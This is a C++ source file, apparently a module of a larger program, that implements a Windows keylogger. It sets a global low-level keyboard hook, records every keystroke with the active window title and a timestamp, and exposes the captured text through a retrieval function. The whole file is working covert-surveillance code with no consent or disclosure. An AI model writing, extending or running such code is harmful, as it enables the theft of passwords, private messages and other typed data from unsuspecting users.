#include "Keylogger.h"
#include "../utils/Logger.h"
#include <windows.h>
#include <vector>
#include <mutex>
#include <thread>
#include <atomic>
#include <algorithm>
#include <map>
#include <ctime>
#include <sstream>

namespace capture {

    namespace {
        HHOOK g_hHook = NULL;
        std::mutex logMutex;
        std::string keylogBuffer;
        std::thread loggerThread;
        std::atomic<bool> isLogging{false};
        std::string lastTitle;
        DWORD loggerThreadId = 0;

        std::string GetActiveWindowTitle() {
            char title[256];
            HWND hwnd = GetForegroundWindow();
            GetWindowTextA(hwnd, title, sizeof(title));
            return std::string(title);
        }

        LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
            if (nCode >= 0 && wParam == WM_KEYDOWN) {
                KBDLLHOOKSTRUCT* kbd = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

                std::lock_guard<std::mutex> lock(logMutex);

                std::string currentTitle = GetActiveWindowTitle();
                if (currentTitle != lastTitle) {
                    lastTitle = currentTitle;
                    time_t now = time(nullptr);
                    char dt[32];
                    ctime_s(dt, sizeof(dt), &now);
                    dt[strcspn(dt, "\n")] = 0;
                    keylogBuffer += "\n[" + std::string(dt) + "] " + currentTitle + "\n";
                }

                std::string key;
                if (kbd->vkCode >= 'A' && kbd->vkCode <= 'Z') {
                    key = std::string(1, static_cast<char>(kbd->vkCode + (GetKeyState(VK_SHIFT) < 0 ? 0 : 32)));
                } else if (kbd->vkCode >= '0' && kbd->vkCode <= '9') {
                    key = std::string(1, static_cast<char>(kbd->vkCode));
                } else {
                    switch (kbd->vkCode) {
                        case VK_SPACE:   key = " "; break;
                        case VK_RETURN:  key = "[ENTER]\n"; break;
                        case VK_BACK:    key = "[BACK]"; break;
                        case VK_TAB:     key = "[TAB]"; break;
                        case VK_ESCAPE:  key = "[ESC]"; break;
                        default:         key = "[VK:" + std::to_string(kbd->vkCode) + "]";
                    }
                }

                keylogBuffer += key;

                if (keylogBuffer.size() > 32 * 1024) {
                    keylogBuffer = keylogBuffer.substr(keylogBuffer.size() - 24 * 1024);
                }
            }
            return CallNextHookEx(g_hHook, nCode, wParam, lParam);
        }

        void LoggerLoop() {
            MSG msg;
            while (isLogging) {
                while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
                    TranslateMessage(&msg);
                    DispatchMessageA(&msg);
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
    }

    void StartKeylogger() {
        if (isLogging) return;
        isLogging = true;

        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        if (!g_hHook) {
            LOG_ERR("SetWindowsHookEx failed: " + std::to_string(GetLastError()));
            isLogging = false;
            return;
        }

        LOG_INFO("Keylogger hook installed (hHook = " + std::to_string((uintptr_t)g_hHook) + ")");

        loggerThread = std::thread([]() {
            loggerThreadId = GetCurrentThreadId();
            LoggerLoop();
        });
    }

    void StopKeylogger() {
        if (!isLogging) return;
        isLogging = false;

        if (g_hHook) {
            UnhookWindowsHookEx(g_hHook);
            g_hHook = NULL;
            LOG_INFO("Keylogger hook removed");
        }

        if (loggerThreadId) {
            PostThreadMessage(loggerThreadId, WM_QUIT, 0, 0);
        }

        if (loggerThread.joinable()) {
            loggerThread.join();
        }
    }

    std::string GetAndClearKeylog() {
        std::lock_guard<std::mutex> lock(logMutex);
        if (keylogBuffer.empty()) return "";
        std::string logs = keylogBuffer;
        keylogBuffer.clear();
        return logs;
    }

}
